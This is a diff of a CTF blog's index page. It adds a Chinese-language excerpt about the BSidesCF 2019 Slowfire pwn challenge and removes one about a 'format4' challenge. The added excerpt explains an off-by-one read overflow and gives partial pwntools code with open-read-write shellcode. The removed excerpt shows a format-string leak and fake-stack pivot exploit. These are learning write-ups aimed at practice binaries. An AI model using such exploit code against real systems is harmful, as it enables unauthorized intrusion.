@@ -170,6 +170,25 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2>BSidesCF 2019 Slowfire
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>[BSidesCF 2019]Slowfire 题目：[[BSidesCF 2019]Slowfire](https://buuoj.cn/challenges#[BSidesCF 2019]Slowfire)
+写在前面：
+以前做ctf都只注重漏洞的利用，但是现在发现，发现漏洞也很重要
+首先还是查看保护：
+这道题一个保护没开，本以为可以直接拿下，但是我天真了。
+找了半天没找到漏洞在哪里，最后去百度了一下才发现漏洞和以前接触的显而易见的溢出不一样：
+通过上面这张图，乍一看没问题，但是如果读取的长度大于0x400（比如0x500），当第一次循环的时候，因为buf_size的关系会读取0x400个字节，但是这时total的值为0x400。这时buf_size和total都为0x400，所以不会触发while，导致do又执行了一次，遭成了溢出。
+#!/usr/bin/python3from pwn import *context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)file_name = &#39;./slowfire&#39;p = remote(&#39;node4.buuoj.cn&#39;, 29861)elf = ELF(file_name)# open read writeshellcode = &#39;&#39;&#39;mov edi, 0x4040c0mov esi, 0mov eax, 2 //opensyscallmov rdi, raxmov esi, 0x404180mov edx, 0x100mov eax, 0x401080	//readcall raxmov edi, DWORD PTR [rsp-0x444]mov esi, 0x404180mov edx, 0x100mov eax, 0x401040	//writecall rax&#39;&#39;&#39;p....</p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to BSidesCF 2019 Slowfire" href="https://jellyfish-pro.github.io/ctf/bsidescf-2019slowfire/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2>enumcanary
     </h2>
   </header>
@@ -397,32 +416,6 @@ leave = MOV RSP, RBPPOP RBP 通过这个指令会将RBP的值赋给RSP，那么
   </div>
   <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
   <a class="entry-link" aria-label="post link to format4_new" href="https://jellyfish-pro.github.io/ctf/format4_new/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2>format4_old
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>首先查看保护机制：
-32位程序，开启了栈溢出保护和NX，可以修改got表
-然后我们运行程序，查看程序的内容：
-可以看到这个程序类似于建立通讯目录的功能，我们可以选择创建目录，溢出目录，编辑目录，展示目录，退出。
-根据我们经验，我们可以猜测，我们可以在创建目录里输入格式化字符串的payload，然后再展示目录时利用格式化字符串：
-然后我们在IDA中查看文件：
-这里我将每个函数都根据内容重新命名了，因为我们知道了展示目录的选项中有格式化字符串漏洞，所以我们进入show函数就可以找到这个全是printf函数的函数（这里我将其命名为printff）：
-现在，我们知道了格式化字符串，got表也是可以修改的，那么我们可以选择修改printf函数的got表为system函数了吗？
-答案是否定的，因为这个程序不仅在这里使用了printf函数，在其他的功能里都使用了printf函数，如果直接修改got，并不能保证程序会按照我们的意愿进入system函数。
-而且，在gdb调试中我们是可以看到，其实我们输入进程序的字符，并不是存在栈上的，而是存在于.bss段中，也就是堆中。
-所以这道题我们不能直接利用%n修改栈中的值来获得shell。
-那么我们可以换一个思路，首先利用程序，将在堆上构建一个虚假的栈，然后将函数ebp的值修改为虚假的栈的起始地址。
-1.利用程序创建目录的功能，在堆上写入一个虚假的栈。2.利用格式化字符串，修改函数的ebp3.当函数返回时，栈地址就会来到我们构建的虚假地址。 通过IDA我们可以看到程序并没有system函数和/bin/sh
-所以我们还是要泄露程序的libc版本：
-from pwn import *sh = process(&#39;./format4&#39;)#sh = remote(&#39;10.0.25.109&#39;,20004)contact = ELF(&#39;./format4&#39;)#context.log_level = &#39;debug&#39;#通过创建目录选项，输入payloaddef createcontact(name, phone, descrip_len, description):sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)sh.sendline(&#39;1&#39;)sh.recvuntil(&#39;Contact info: \n&#39;)sh.recvuntil(&#39;Name: &#39;)sh.sendline(name)sh.recvuntil(&#39;You have 10 numbers\n&#39;)sh.sendline(phone)sh.recvuntil(&#39;Length of description: &#39;)sh.sendline(descrip_len)sh.recvuntil(&#39;description:\n\t\t&#39;)sh.sendline(description)#输入payload后利用printf函数展示结果def printcontact():sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)sh.sendline(&#39;4&#39;)sh.recvuntil(&#39;Contacts:&#39;)sh.recvuntil(&#39;Description: &#39;)printf = 0x08048BD1# get system addr &amp; binsh_addrpayload = &#39;%31$paaaa&#39;createcontact(&#39;1111&#39;, &#39;1111&#39;, &#39;111&#39;, payload)printcontact()libc_start_main_ret = int(sh....</p>
-  </div>
-  <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
-  <a class="entry-link" aria-label="post link to format4_old" href="https://jellyfish-pro.github.io/ctf/format4_old/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
